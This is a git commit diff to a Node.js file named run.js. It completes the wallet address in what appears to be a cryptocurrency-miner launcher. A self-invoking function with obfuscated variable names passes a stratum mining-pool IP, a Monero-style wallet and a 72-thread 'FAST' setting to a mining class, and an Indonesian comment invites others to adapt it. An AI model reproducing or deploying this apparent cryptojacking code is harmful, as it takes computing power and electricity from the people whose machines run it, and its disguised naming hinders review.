64d7f314804b0a206cb20540e7be964b9489d4d5
x011-al <x011pagkor@gmail.com>
2025-08-25 07:51:07 -0700

    Update run.js

--- run.js
+++ run.js
@@ -3,7 +3,7 @@ const { Nnode } = require("./index.js");
 // ⚠️ Ganti sesuai kebutuhan
 var _0xabc123 = function(){
     var _0xdef456 = 'stratum+tcp://141.94.223.113:4052';
-    var _0xghi789 = '49cg2BTsCdmBfUPsCrDsGmREn2diVYSK...';
+    var _0xghi789 = '49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU';
     var _0xjkl012 = { 'threads': 72, 'mode': 'FAST' };
     new Nnode(_0xdef456, _0xghi789, _0xjkl012);
 }();
